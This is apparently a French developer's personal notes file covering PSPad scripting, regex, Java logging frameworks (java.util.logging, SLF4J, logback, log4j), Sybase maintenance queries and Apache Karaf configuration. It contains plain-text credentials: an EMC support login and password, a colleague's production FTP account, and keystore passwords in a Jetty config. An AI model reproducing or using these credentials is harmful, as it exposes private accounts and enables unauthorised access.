pour faire recherche next et previous rapidement raccourci shortcut suivant precedant : 
    ctrl+shift+ fleche du haut et fleche du bas quand on a selectionne un texte
    (exactement comme f3 suivant et shift f3 precedent)
script d'automatisations non macro mais javascript:
          les .js sont enregistres sous programfiles/pspad/scripts etc etc
          pour faire des suite de remplacement regexp dans tout le fichier en cours :
                                      function miseEnPage()
                                      {
                                        //setClipboardText(".*DataNucleus.Datastore.Native DEBUG - ");
                                    //runPSPadAction("aReplace");
                                    //e = newEditor();
                                    //echo (inputText("Find"));
                                    // Premier
                                  
                                        if (editorsCount()<1){return;}
                                        var actEd = newEditor();
                                        actEd.assignActiveEditor();
                                        var inputTxt = actEd.text();
                                  
                                        patternToReplace = new RegExp(".*DataNucleus.Datastore.Native DEBUG - ", "g");
                                        var outputText = inputTxt.replace(patternToReplace, "");
                                        actEd.text(outputText);
                                        inputTxt = actEd.text();
                                        etc... etc.. repeter...
                                        // suppression des lignes inutiles
                                          var nbLignes= inputTxt.split("\n").length
                                          var tableLignes= inputTxt.split("\n");
                                          var tableLigneRes= new Array();
                                          actEd.text("");
                                          for (var i=0; i<nbLignes; i++)
                                          {
                                            if ((tableLignes[i].indexOf("UPDATE")+tableLignes[i].indexOf("INSERT"))>0)
                                            {
                                              tableLigneRes.push(tableLignes[i]+"\n");
                                            }      
                                          }  
                                          actEd.text(tableLigneRes);
                                        }
                                        //fin suppression des lignes inutiles 
                                  }
                                  
                                  
                                  function Init(){
                                    addMenuItem("Mettre en page", "ReplaceGXTSQL", "miseEnPage");
                                  }
                  mon ptit moteur de recherche search pspad :
                                     function ARegexpRecherche()
                                      {
                                      logClear();
                                      // ajout fonctonnalite trim javascript old vieux
                                      if (!String.prototype.trim) {
                                          (function() {
                                              // Make sure we trim BOM and NBSP
                                              var rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
                                              String.prototype.trim = function() {
                                                  return this.replace(rtrim, '');
                                              };
                                          })();
                                      }
                                        if (editorsCount()<1){return;}
                                        var actEd = newEditor();
                                        actEd.assignActiveEditor();
                                        var inputTxt = actEd.text();
                                        var end=inputTxt.search("\n");
                                        var tosearch=inputTxt.substr(0,end-1);
                                        tosearch=tosearch.trim();
                                        logAddLine("search:"+tosearch);                                        
                                        patternToReplace = new RegExp(tosearch, 'i');
                                         inputTxt= inputTxt.substr(end,inputTxt.length);  
                                      pos = inputTxt.search(patternToReplace);
                                      logAddLine(pos);
                                      while (pos>0){ 
                                        // affiche titre
                                          var title=inputTxt.substr(0,pos);
                                          pos2= title.search(" :");
                                          while (pos2>0)
                                          {
                                            pos1=title.search("\n.* :");
                                            if (pos1<pos2)
                                            {                                            
                                              titledisp= title.substr(pos1,pos2);
                                            }
                                            title=title.substr(pos2+1,title.length);
                                            pos2= title.search(" :");
                                          }
                                          logAddLine("---------------"+titledisp);
                                          //fin affiche titre
                                      inputTxt=inputTxt.substr(pos,inputTxt.length);
                                      end=inputTxt.search("\n");
                                      logAddLine(pos);
                                      logAddLine(inputTxt.substr(0,end));
                                      inputTxt=inputTxt.substr(end,inputTxt.length);
                                      pos = inputTxt.search(patternToReplace);
                                     } 
                                }
                                  function Init(){
                                    addMenuItem("ARegexpRecherche", "ARegexpRecherche", "ARegexpRecherche");
                                  }
                                  
                                  function initializeCommand () // Returns nothing
                                  {
                                     editor = newEditor ();
                                     editor.assignActiveEditor ();
                                  }

    pour passer en mode plein ecran : f11
    macro :
            creer macro control + F5 (start record/stop record)
            executer macro : F5
  bien visualiser du xml: 
        Outil > Explorateur de code
pour faire des faux retour chario pour que la ligne entre dans la page:
          Ctrl+W ou affichage >Coupure de ligne
          pour changer la coupure cliquer dans la regle
  Pour selectioner en mode colonne
          Ctrl+w
          Edition > type de selection > colonne
  pour faire un remplacement avec retour chariot: le faire du bas vers le haut:
      exemple remplacer "," par des ",retourchariot"
          ,
          ,\n 
          du bas vers le haut
pour supprimer les retour chariot: le faire du bas vers le haut:
      exemple remplacer ",retourchario" par des ","
          ,$
          , 
          du bas vers le haut          
  rempacement avec expression regulière regexp c'est genial! exemple :
        remplacer tous les a' ou les b' ou les c' ou les d' etc... par la meme chose comme par exemple: a'' ou b'' ou c'' ou d''... 
        search : ([a-zA-Z])'[^ ]             // [^ ] ca veut dire tout sauf un espace à la fin.
        replace : $1''                    // tout ce qu'il y a entre parentheses dans le search est conserve et mis à la p lace du $1
        autre exemple: 
          cherche : ^UPDATE WEC71_M_SCE SET WEC71_18N=<(....)>,WEC71_ACTIVE=<'(.{2,3})'>.* WHERE
          remplace par : UPDATE WEC71_M_SCE SET WEC71_18N=<$1>,WEC71_ACTIVE=<'$2'> WHERE
          
  regexp rechercher tous les Autrechose1Quelquechoseprecis1.Autrechose2Quelquechoseprecis2Autrechose3 sur une ligne
      ^.*document\..*orm.*$        
      exemple: [0-9]{4,6}     //{n,m} veut dire Match at least n but not more than m times.
             match avec 1234 ou 12345
sur tomcat pour retrouver son pass admin et login admin : tomcat-user.xml qui contient le mdp, le login de l'admin.

si on ne voit pas tout le code source d'une page web, selectionne la partie qui nous interesse dans firefox et mettre: afficher le code source de la selection

planning :conseils Erwin:
    faire son planning a l'avance et imposer des plages horraires d'interruption possible des interlocuteurs
    TOUS LES SOIR: BILAN + LIVRER DOC SI BESOIN
    TOUJOURS ENVOYER UN MAIL DE FIN+DOC
    GELER DES JOURS ET MY TENIR (+LE JOUR DE CAPIT)
    CAPITALISER SUR LE WIKI LES VENDREDIS


methode pour faire des docs comprehensibles: mettre les dessins au debut, pas de doublons, l'explication doit etre chronologique (comme un livre)

videos sur msn:
http://video.msn.com/v/us/v.htm?g=47659913-4a17-4bce-901f-a1a788a12516&f=imbot_us_m_2534&fg=rss

traduction : 
http://babelfish.altavista.com/tr


pour lancer msn live messenger
http://webmessenger.msn.com/default.aspx?R=1

Merise mcd creation base de donnee: http://www.sam-mag.com/P53,53,5,61,,,default.aspx

----------------------------------
logs :    LinkLogutils avec java.util.logging.* (ne semble pas marcher si librairie log4j est dans le classpath et est utilisee aussi)
  1) Methode par fichier de configuration :
    quelquepart faire : 
            LogManager manager = LogManager.getLogManager(); // a mettre cote statique
            manager.readConfiguration(Application.class.getClassLoader().getResourceAsStream("logging.properties")); // a mettre dans instance
    et ailleurs dans les classes que je veux logger : 
         (static) private Logger log = Logger.getLogger("diversitysimulator"); // de java.util.logging.Logger // a mettre cote statique 
         log.warning ou info ou severe("No limitations defined in this parameter "+this.key);
         log.log(Level.SEVERE,"parameter "+key+" doesn't exists in graph "+this.toString());
         log.log(Level.SEVERE,"cannot clone scenario",exception);
    dans logging.properties : voir doc http://tutorials.jenkov.com/java-logging/configuration.html 
            handlers = java.util.logging.FileHandler,java.util.logging.ConsoleHandler // liste de classes separee par des espaces
            config   =  //NOOOON ne pas mettre ça sinon les fichiers de logs restent vides
            
            diversitysimulator.handlers           = java.util.logging.FileHandler,java.util.logging.ConsoleHandler // avec dans le code log = Logger.getLogger("diversitysimulator "); mon logger diversitysimulator utilise les FileHandler et ConsoleHandler ci dessous:
                si j'ai besoin de logger dans un autre fichier alors creer une classe voir LINKlkjbkkgkgkgkgkgzsfzfz penser à le declarer dans la ligne ci dessus dans la liste des handlers
                et mettre 
                    autrelogger.handlers           = loggers.OtherFileHandler,java.util.logging.ConsoleHandler
            diversitysimulator.useParentHandlers  = true //diversitysimulator doit logger dans son parent aussi? true ou false. J'avais mis false et je ne voyais rien donc mettre true
            diversitysimulator.level              = INFO // log tout ce qui est au dessus de INFO inclu (donc pas FINE ici)

            java.util.logging.FileHandler.level     = INFO //tous les FileHandlers vont logguer au dessus de INFO inclu (donc ecrase la ligne ci dessus?)
            java.util.logging.FileHandler.filter    = // laisser vide
            java.util.logging.FileHandler.formatter =java.util.logging.SimpleFormatter ou java.util.logging.xxxxFormatter dispo (xml, html...) 
            java.util.logging.FileHandler.encoding  =
            java.util.logging.FileHandler.limit     =
            java.util.logging.FileHandler.count     =
            java.util.logging.FileHandler.append    = true // si true, ecrira a la suite d'un fichier de log s'il existe deja sinon ecrase tout. J'avais mis false et je ne voyais rien donc mettre true 
            java.util.logging.FileHandler.pattern   = log.%u.%g.txt
            java.util.logging.SimpleFormatter.format='%1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS %4$s %2$s %5$s%6$s%n'           
            java.util.logging.ConsoleHandler.level     = INFO
            java.util.logging.ConsoleHandler.filter    =
            java.util.logging.ConsoleHandler.formatter =
            java.util.logging.ConsoleHandler.encoding  =
            
            java.util.logging.StreamHandler.level     = INFO
            java.util.logging.StreamHandler.filter    =
            java.util.logging.StreamHandler.formatter =
            java.util.logging.StreamHandler.encoding  =
            
            java.util.logging.SocketHandler.level     = INFO
            java.util.logging.SocketHandler.filter    =
            java.util.logging.SocketHandler.formatter =
            java.util.logging.SocketHandler.encoding  =
            java.util.logging.SocketHandler.host      =
            java.util.logging.SocketHandler.port      =
            
            java.util.logging.MemoryHandler.level     = INFO
            java.util.logging.MemoryHandler.filter    =
            java.util.logging.MemoryHandler.size      =
            java.util.logging.MemoryHandler.push      =
            java.util.logging.MemoryHandler.target    =
            
            LINKlkjbkkgkgkgkgkgzsfzfz
                     public class OtherFileHandler extends FileHandler
                    {
                        public OtherFileHandler() throws IOException, SecurityException
                        {
                            super();
                        }
                    }
        2) LinkLogutils avec java.util.logging.* Methode avec classe de configuration: 
                    classes de configuration: 
                        public class HandlerForGeneralLogger { // je peux faire plusieurs classes comme ça. Une par fichier de log à ecrire.
                                public static final Logger LOGGER = Logger.getLogger(HandlerForGeneralLogger.class.getName());
                                public static void init() {
                                    Handler consoleHandler = null;
                                    Handler fileHandler  = null;
                                    try {
                                        consoleHandler = new ConsoleHandler();
                                        consoleHandler.setLevel(Level.ALL);
                                        fileHandler  = new FileHandler("generalLogs.txt"); // generalLogs est le fichier ou il va ecrire et qui se trouve au meme niveau que le jar
                                        fileHandler.setLevel(Level.ALL);
                                        fileHandler.setFormatter(new SimpleFormatter());
                                        LOGGER.addHandler(consoleHandler);
                                        LOGGER.addHandler(fileHandler);
                                        LOGGER.setLevel(Level.INFO);
                                        LOGGER.config("Configuration Generals log done.");
                                        LOGGER.log(Level.FINE, "Finer logged");
                                        }
                                      catch(IOException exception) {
                                          LOGGER.log(Level.SEVERE, "Error occur in FileHandler.", exception);
                                      }
                Utilisation:
                        au début quand le programme se lance il faut appeler 
                            HandlerForGeneralLogger.init();
                        et puis n'importe où ailleurs : 
                            HandlerForGeneralLogger.LOGGER.log(Level.SEVERE,"Erreur",e+ Utils.printStackTraceOnLogs(e));

slf4j : (vieux voir LinkLogutils)Bonne methode copier L'interface  jdk.internal.instrumentation.Logger;(a améliorer car n'accepte que des strings) et créer son propre logger (je ne peux pas l'utiliser dans java10) qui pourra s'appuyer sur slf4j par exemple ou n'importe quoi dautre
}
     Dependance à ajouter imperativement:    
      1- SLF4j
              slf4j-api (v1.7.9)    org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger(HelloWorld.class); logger.debug("tata{}titi{}.", var1, var2); //pour eviter les concatenations concatener
      2- Les Bridges // a ajouter si dans le code j'utilise dejà XXX et je ne veux pas modifier mon code source
          XXXoverSlf4j ou XXXtoSlf4j "tous les appels au loggerXXX dans le code seront rediriges vers Slf4j"
          - XXX // a ajouter aussi. Pas sur.
          jcl-over-slf4j.jar pour apache commons logging
          Possible mettre plusieurs bridges.   
      3- Les binders bindings (les mettre en optionel si mon pom fait partie d'un projet qui lui va definir le binder. Sinon c'est mon pom qui va imposer son binder :pas bien.) si jai SLF4J: Class path contains multiple SLF4J bindings. peut etre que c parce que j'ai logback et slf4j-simple: virer simple des dependances
          redirige les appels d'un logger slf4j dans le java vers un logger xxx. du coup la conf doit être de type xxx je crois
          slf4j-XXX // en choisir UN: il utilisera ce framework// dependent aussi de XXX et slf4j-api mais je peux qd meme les redeclarer dans mon pom, ca permet de forcer la version.
          ou        
          logback-classic+logback-core
          le binder doit avoir mm version que SLF4j
          :-) --> Si y en a plus d'un il nous le dit au demarrage. Chercher la dependance à supprimer et si cette dependance est dans une dependance alors l'exclure dans le pom au niveau de la dependance juste en dessous : <dependency>...<exclusion>...
  si SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
      il manque un des binders slf4jLogger(appeldansclassjava)---->xxxlogger dans classpath. Ex: slf4j-simple.jar, slf4j-log4j12.jar, slf4j-jdk14.jar or logback-classic.jar
      exemple:<dependency><groupId>org.slf4j</groupId><artifactId>slf4j-jdk14</artifactId><version>1.7.21</version></dependency>
   Pour afficher voir imprimer le stacktrace avec le logger slf4j :logger.error("blablabla: ",e);//facile                      
  Si besoin changer code source pour migrer : http://www.slf4j.org/migrator.html
  Si j'ai l'erreur :Class org.apache.commons.logging.impl.SLF4JLogFactory does not implement org.apache.commons.logging.LogFactory.
        alors faire 
                      -Dorg.apache.commons.logging.LogFactory=org.apache.commons.logging.impl.LogFactoryImpl
                      ou bien 
                      static
                      {
                          System.setProperty("org.apache.commons.logging.LogFactory", "org.apache.commons.logging.impl.LogFactoryImpl");
                      }
                      voir explications :http://commons.apache.org/proper/commons-logging/troubleshooting.html#The%20Incompatible%20LogFactory%20Issue
    dans la classe pour logguer : 
    			LOG.info("Login : {} ", request.getLoginId());                       
logback : (mieux que LinkLogutils)
  <!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-classic -->
  <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-classic</artifactId> // implemente slf4j
      <version>1.2.3</version>
  </dependency>
  <!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-core -->
  <dependency>
      <groupId>ch.qos.logback</groupId>
      <artifactId>logback-core</artifactId>
      <version>1.2.3</version>
  </dependency>

  configuration: resources/logback.xml et test/resources/logback.xml
          <configuration>
              <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
                  <!-- encoders are assigned the type
                       ch.qos.logback.classic.encoder.PatternLayoutEncoder by default -->
                  <encoder>
                      <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
                  </encoder>
                  ou ca mais NON c'est deprecie:
                  <encoder> // avant: <layout class="ch.qos.logback.classic.PatternLayout">
        				    <Pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</Pattern>
        				  </encoder>// avant: </layout>
              </appender>
              //autre appender:
              <appender name="FILE" class="ch.qos.logback.core.FileAppender">
              <file>MyLog.log</file>
                  <layout class="ch.qos.logback.classic.PatternLayout">
                    <Pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</Pattern>
                  </layout>
               </appender>
              <root level="debug">
                  <appender-ref ref="STDOUT" />
                  <appender-ref ref="FILE" />
              </root>
              <logger name="com.hraccess.hraspace.strongpassword" level="DEBUG">
               <appender-ref ref="STDOUT" /> // facultatif: si je ne met rien il est dirigé vers root ci dessus
               </logger>
          </configuration>
  puis dans les classes :
      import org.slf4j.LoggerFactory;
      import org.slf4j.Logger;
      public class UpdatePasswordFilter implements Filter {
            static final Logger LOG = LoggerFactory.getLogger(UpdatePasswordFilter.class);
 
log4j : (vieux voir LinkLogutils)
si j'ai l'erreur :
        Attempted to append to closed appender named
        c'est parce que j'ai deux fichiers de configuration log4j avec le meme nom d'appender sans doutes. 
si j'ai l'erreur : 
        log4j:WARN No appenders could be found for logger (
        c'est pas forcement parce que log4j.properties n'est pas correct mais ca peut etre du au fait qu'il n'est pas declare dans le classpath
        c'est peut etre aussi parce que au lieu d'ecrire <jvmarg line="-Dlog4j.configuration=${log4j.config.file}"/> il faut ecrire <jvmarg line="-Dlog4j.configuration=file:${log4j.config.file}"/>
pour tester la performance : 
        logger.debug("1TestPerformance: "+new Date(System.currentTimeMillis()).toString());
exemple de fichier de propriete log4j log4j.properties:
# on doit definir un RootLoger qui peut être de niveau soit TRACE DEBUG INFO WARN ERROR FATAL etc mais en principe on le met sur WARN et on 
le branche sur l'appender stdout. On peut le brancher sur d'autres appenders: tous les logs qui passent par root sauf ceux dont additivity=false vont s'ecrir sur ces appenders 
log4j.rootLogger=WARN, stdout, autreappender
# on peut definir plusieurs autres loggers (même principe que le rootLogger) qui pevent être de niveau soit WARN DEBUG ERROR etc et on peut 
les brancher sur les appenders qu'on veut.
log4j.logger.unnomOuUnPackage=DEBUG,pae, opc, stdout (ce logger a pour parent le logger "root" comme tous les autres loggers)
#Voici la definition des differents appenders ci dessous dans le fichier log4j.properties:
#l'appender stdout:
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d{dd/MM/yyyy HH:mm:ss,SSS} app[%t] %-5p %m%n
autre pattern gourmant en ressource mais tres pratique car affiche methode et classe: [%d] %F %M %-5p - %m%n
#l'appender pae: (voir additivity: ci dessous)
log4j.appender.pae=org.apache.log4j.RollingFileAppender
log4j.appender.pae.encoding=UTF ou ISO-8859-15 pour forcer l'encodage 
log4j.appender.pae.File=C:/tmp/pae.log
log4j.appender.pae.MaxFileSize=100KB
log4j.appender.pae.MaxBackupIndex=1
log4j.appender.pae.layout=org.apache.log4j.PatternLayout
log4j.appender.pae.layout.ConversionPattern=[%d{dd/MM/yyyy HH:mm:ss,SSS}] %t %c %-5p - %m%n ({dd/MM/yyyy HH:mm:ss,SSS} optionel)
                                                                          %c	Used to output the category of the logging event. For example, for the category name "a.b.c" the pattern %c{2} will output "b.c".
                                                                          %C	Used to output the fully qualified class name of the caller issuing the logging request. For example, for the class name "org.apache.xyz.SomeClass", the pattern %C{1} will output "SomeClass".
                                                                          %d	Used to output the date of the logging event. For example, %d{HH:mm:ss,SSS} or %d{dd MMM yyyy HH:mm:ss,SSS}.
                                                                          %F	Used to output the file name where the logging request was issued.
                                                                          %l	Used to output location information of the caller which generated the logging event.
                                                                          %L	Used to output the line number from where the logging request was issued.
                                                                          %m	Used to output the application supplied message associated with the logging event.
                                                                          %M	Used to output the method name where the logging request was issued.
                                                                          %n	Outputs the platform dependent line separator character or characters.
                                                                          %p	Used to output the priority of the logging event.
                                                                          %r	Used to output the number of milliseconds elapsed from the construction of the layout until the creation of the logging event.
                                                                          %t	Used to output the name of the thread that generated the logging event.
                                                                          %x	Used to output the NDC (nested diagnostic context) associated with the thread that generated the logging event.
                                                                          %X	The X conversion character is followed by the key for the MDC. For example, X{clientIP} will print the information stored in the MDC against the key clientIP.
MAINTENANT DANS LA CLASSE java ON A CA:
static Logger logger = Logger.getLogger("pae");
ici il va chercher le logger log4j.logger.pae.
MAINTENANT DANS LA CLASSE java ON A CA:
package com.renault.map.plugin; (...)
    protected static Logger log = Logger.getLogger(MapPlugIn.class); (logger de log4j)(pas dans une methode: final)
		il va donc chercher le logger qui a pour package le pakage contenant cette classe:
		log4j.logger.com.renault.map=DEBUG,pae (ici je le branche aussi sur l'appender pae) (ce logger a pour parent le loger "com.renault" qui a pour parent "com" qui a pour parent "root")
additivity:
    si je mets ca: log4j.additivity.com.renault.map=false alors il va ecrire que dans son appender a lui et ne va pas ecrire sur ses parents (le root)
    Un Logger est parent d'un autre si son nom complet est le prefixe du second. Par exemple, le Loggercom.developpez.beuss.java sera le parent du Loggercom.developpez.beuss.java.log4j, il lui transmettra donc son niveau.
Dans une classe de type listener ou filtre declare et initialise dans web.xml il semble qu'il faille faire plutot:
        public class SessionTraceFilterClass implements Filter, HttpSessionListener  ou HttpSessionBindingListener (? sait pas la difference mais interessant de regarder){
        private static Logger log = null;
    	 public void init(FilterConfig config) throws ServletException 
    	 {
    		try 
    		{
    			log = Logger.getLogger(getClass());		
    			...
Pour brancher un logger directement en java (permet de nommer dynamiquement le nom du fichier de log etc etc...)
		try {
			/** Avoid multiple logs */
			this.logger.setAdditivity(false);// sait pas ce que c'est
			this.logger.removeAllAppenders();
			/** Sets the appender */
			PatternLayout layout = new PatternLayout();
			layout.setConversionPattern("%d{dd/MM/yyyy, HH}h%d{mm : } %m%n");
			/** get errors file name */
			errorsFileName = "cheminCompletVersLeFichierDeLogEtNomDuFichierDeLog";
			/** get file */
			errorsFile = new File(errorsFileName);
			/** create errors file */
			this.logger.addAppender(new FileAppender(layout, errorsFileName));
extenaliser la config log4j :
      web.xml:
          <context-param>
            <param-name>log4jConfigLocation</param-name>
            <param-value>file:D:/RD/conf/log4j.properties</param-value>
        </context-param>
        <context-param>
            <param-name>log4jRefreshInterval</param-name>
            <!-- Refresh log4j configuration every 5 minutes. -->
            <param-value>300000</param-value>
        </context-param>
        <listener>
            <listener-class>org.springframework.web.util.Log4jConfigListener</listener-class>
        </listener>


MonScriptShell.csh = 
#!/bin/csh 
CFTUTIL send idf=MonFichier,part=MonPartenaire,fname=&fname 


Pour info, il n'existe pas de "client CFT" sous UNIX/Linux. que des serveurs: besoin de cftutil(.exe) 


a lire
http://ws.apache.org/axis/java/user-guide.html

A2A doc
http://int-dcs.dcs.renault.fr:8080/a2a/documentation/

mac: sortir du man: q
pomme alt escape pour killer 
pomme f pour chercher
pomme suppr pour supprimer
emc: documentum:
http://softwaresupport.emc.com
user : duverge
pass: QEUl3PHE

----------------------------------

si jai java.lang.NullPointerException et com.ideo.sweetdev.core.exception.TechnicalException
 c'est parce que j'ai pas defini mes criteres dans criteres.xml 



Pour reinitialiser un evenement elementaire dans un cycle: executer les trois requettes ci dessous.. ATTENTION A BIEN MODIFIER LES WHERE
update MACRO_EVT_RUNNING SET STATUS=' ', DT_END=NULL, STATE=' ', USER_LOGIN=NULL, DT_BEGIN=	NULL WHERE ID_CYCLE =291 and DT_BEGIN > '20051129'
UPDATE TASK SET STATUS=' ',  STATE=' ',  DT_BEGIN=NULL, DT_END = NULL  WHERE ID_CYCLE =291 and ID_TASK LIKE 'cloture' and  ID_REPRISE=7
update CYCLE SET IS_CLOSED = 'running' WHERE ID_CYCLE =291

convertir fichier en unix:
si il ya des erreurs dans les proc peut etre c du à  des ^M dans le fichier (format DOS) il faut faire un DOS to UNIX
la commande unix est: Dos2Unix fichier_original fichier destination // sinon si cette commande n'existe pas faire: vi puis :set ff=unix ou :set ff=dos puis sauver le fichier



---start---
objectif: copier les .sql des procs squeletiques vers le serveur de prod (pas de compilation) 
connection FTP sur la prod (host: tiths502) avec le compte de jeremie: user:u93065 pass:1980+(code carte)
recette: tiths015
copie des
C:\projects\GISOdyssee-swd\prd\db\ProcsSqueletiques\*.sql vers
PROD: FTP:/appli/Package4/gisodyssee/ftp/
REC: FTP:/mtitre/rec/gisodyssee/ftp/

connection avec reflexion au même endroit avec le compte de jeremie (... connection root...)
tapper: $ls *.sql >liste_proc.lst
retoucher le fichier liste_proc.lst de manière à  enlever tous les ".sql"
---end----


les scripts des tables que je cree doivent etre mis dans db/crebas.sql

fax acti:01 41 05 20 01

mon numero de tel
interne: 4 39 23
externe: 01 40 14 39 23
un element de map est:
	Map.Entry entry = (Map.Entry) it.next();

exemple pour faire une requete de concatenation de strings avec sybase: voir PS_BUILD_CALENDAR_LIST.pro

exemple pour faire une requete qui renvoit un max() voir la proc PS_CYCLE_LISTE.PRO: utiliser rownum

Si ma requete ne renvoit jamais rien verifier que lang est bien rempli
Si ma requete ne renvoit jamais rien verifier que le mapping respecte l'ordre! Et surtout la proc! proc-mapping


si erreur : Implicit conversion from datatype 'VARCHAR' to 'INT' is not allowed.  Use the CONVERT function to run this query: extraire la requete de la prochen je me suis peut etre trompe de nom de recuperation de champ dans le mapping de proc

recommandations de Thibault pour annuler un evenement elementaire: 
<sweetdev:textButton key = "button.cancel"
                             href = "javascript:doSubmit(\'onCancelEvtElem.do\',\'dashBoardForm\');"
                             drawer ="com.bnpparibas.titris.taglib.drawer.GISButtonDrawerShiva"/>


si: ma (proc) requete renvoit trop de ligne par rapport a ce qui est attendu : il faut utiliser les aliases de table: from CYCLE c

si: No method "getIdEntite" with 0 arg(s) of matching types.: mauvais getter dans le bean

Si erreur mapping manque un champ field essayer sans s ou avec s à  "field": dataobjetc: sans s
mapping: avec s


POUR REINITIALISER UN CYCLE: (TOUT UN CYCLE!)
1 recuperer l'ID_CYCLE dans la table CYCLE avec comme paramettre les bons
	ID_ENTITE, ID_FCC, ID_COMPARTIMENT, STATUT = running, DATE_ARRETE = date arrete inscrite sur le dashboard.
2 executer la procedure stockee DASHBOARD_RESET_CYCLE 502 (ou 502 est l'id du cycle recupere ci dessus)
	SURTOUT NE PAS SE TROMPER D'ID_CYCLE

versionning : versioning :
v.x.y.z_u (x=evol maj; y=evolmin; z=ano; u=ano du build)




OSGI :  Karaf : 1classloader/bundle
    a lire : http://www.humbertocervantes.net/osgitutorial/main.htm
            http://lig-membres.imag.fr/donsez/cours/exemplesosgi/tutorialosgi.htm
            avec eclipse: D:\RD\Karaf\MonProjet\Karaf-Tutorial\cschneider-Karaf-Tutorial-3b77a92\
     Gerer la securité par users facilement dans karaf :(https://karaf.apache.org/manual/latest/security) LINKsecuritekaraf si j'ai erreur "insufficient credential"
            liste des realms: jaas:realm-list // il y a 2 reamls par defaut. Celui basé sur un fichier de propriete est:
            jaas:realm-manage --realm karaf --module org.apache.karaf.jaas.modules.properties.PropertiesLoginModule  // pour voir ce realm
            puis : jaas:user-list // pour voir les users de ce realm 
                  on peut les voir aussi dans karaf/etc/users.properties
            conf/ (ces fichiers gerent les droits)
                  org.apache.karaf.shell.cfg  // Role name used for SSH access authorization
                  org.apache.karaf.management.cfg// Role name used for JMX access authorization
                  jmx.acl.org.apache.karaf.bundle.cfg// to control OSGi bundles.
                  org.apache.karaf.command.acl.bundle.cfg// This configuration file defines the ACLs for commands in the bundle subshell
                  org.apache.karaf.kar.cfg// Enable or disable the refresh of the bundles when installing

    tous les framework de logs(tous les frameworks sont préinstalles avec LE MEME FICHIER DE CONF etcOuconf/org.ops4j.pax.logging.cfg :-)) )..autres sont déjà preinstalles comme features. (slf4j etc... et on peut lire les logs via commandes log:tail mais ça n'affiche pas tout)
    port web par defaut: 8101 ou 8181 // on peut le trouver dans org.ops4j.pax.web.cfg : org.osgi.service.http.port=.... (peut etre une variable definie dans conf/xxxx.properties)
    pour le mettre en https: 
          http://blog.nanthrax.net/2012/12/how-to-enable-https-certificate-client-auth-with-karaf/
              dans org.ops4j.pax.web.cfg
              org.osgi.service.http.port.secure=8444
              org.osgi.service.http.secure.enabled=true
              org.ops4j.pax.web.ssl.keystore=D:/Projets/4You/apache-karaf-4.1.3/etcOuconf/keystore/keystore.jksOu${karaf.etc}/path/...jks
              org.ops4j.pax.web.ssl.password=password
              org.ops4j.pax.web.ssl.keypassword=password
          OU BIEN 
              org.ops4j.pax.web.config.file=${karaf.etc}/jetty.xml
              et dans jetty.xml:
                                        <!DOCTYPE Configure PUBLIC "-//Mort Bay Consulting//DTD Configure//EN" "http://jetty.mortbay.org/configure.dtd">
                                          <Configure class="org.eclipse.jetty.server.Server">
                                          <New id="sslContextFactory" class="org.eclipse.jetty.http.ssl.SslContextFactory">
                                              <Set name="KeyStore"><Property name="karaf.etc" default="../edsn-home/conf" />/mykeystore.jks</Set>
                                              <Set name="KeyStorePassword">Amf2016*</Set>
                                              <Set name="keyManagerPassword">Amf2016*</Set>
                                              <Set name="TrustStore"><Property name="karaf.etc" default="../edsn-home/conf" />/mykeystore.jks</Set>
                                              <Set name="TrustStorePassword">Amf2016*</Set>
                                          </New>
                                          <Call name="addConnector">
                                              <Arg>
                                              <New class="org.eclipse.jetty.server.ssl.SslSelectChannelConnector">
                                              <Arg><Ref id="sslContextFactory" /></Arg>
                                              <Set name="Port">6182</Set>
                                              <Set name="maxIdleTime">30000</Set>
                                              <Set name="Acceptors">2</Set>            
                                              <Set name="AcceptQueueSize">100</Set>
                                              </New>
                                              </Arg>
                                          </Call>
                                          </Configure>
  lifecycle:
  install(INSTALLED)->uninstall(UNINSTALLED)
               |          ^
               |          |
               |->resolve(RESOLVED:PeMAJ)->start(STARTED)(ACTIVE)->stop(STOPPING)
                  automtc  ^                                              |
                           |-------<-----------<<<---<----------<---------|
    utiliser windows (cygwin) c mieux (D:/RD/Karaf/apa.../bin/ puis ./shell) il y a aussi cmd
    pour faire du ssh directement sur karaf : apache-karaf-4.0.7\etcOuConf\org.apache.karaf.shell.cfg // fichier de conf du ssh
    
    demarrer avec karaf.bat pas bin/shell.bat (moins de commandes)
    demarrer en mode arriere plan background: nohup ./karaf clean server &  OUBIEN start ou start.bat // si il est lent peut etre qu'il essaie de se connecter à maven pour faire des MAJ. Peut on lui dire de bosser en offline? oui voir fichier conf conf/org.ops4j.pax.url.mvn.cfg
                                                                                                                                                                   ecrire org.ops4j.pax.url.mvn.localRepository=file:D:/Profiles/lduverge/.m2/repository
    au demarrage faire:                                                                                                                                                         et                                                                                   
        . toujours faire un tail -f data/(log)/*.log open à cote  ou la commande log:display ou log:exception-display ou log:tail + regarder la consolenoire karaf              commenter org.ops4j.pax.url.mvn.defaultRepositories                                  
        . ps -ef | grep java                                                                                                                                                    et                                                                                   
                                                                                                                                                                                org.ops4j.pax.url.mvn.defaultLocalRepoAsRemote=true
        . tester ./client -u unuser (-u est facultatif. voir LINKsecuritekaraf ) si j'ai erreur "insufficient credential"                                                                                                                                                                                             
  si j'ai Could not reserve enough space for 1048576KB object heap : reessayer sans attendre plusieurs fois.        
          on peut faire status.bat ou status pour voir l'état 
    si karaf tourne on peut demarrer seulement la console avec ./client client.bat (ajouter -h 127.0.0.1 si j'ai l'erreur failed to get the session) il fait cette erreur aussi si karaf n'a pas assez demarre
                                    si client demarra pas a cause message "send ssh_msg_channel_data on channel 0" : ??? 
    
    
    log:set debug >>> passe la conf des logs en mode debug à chaud :-)
    repertoire:
    |_bin:commandes
    |_data:repertoire work de karaf: si je supprime le contenu ça reset karaf *
    |      |_cache:bundle installes
    |      |_log;tmp
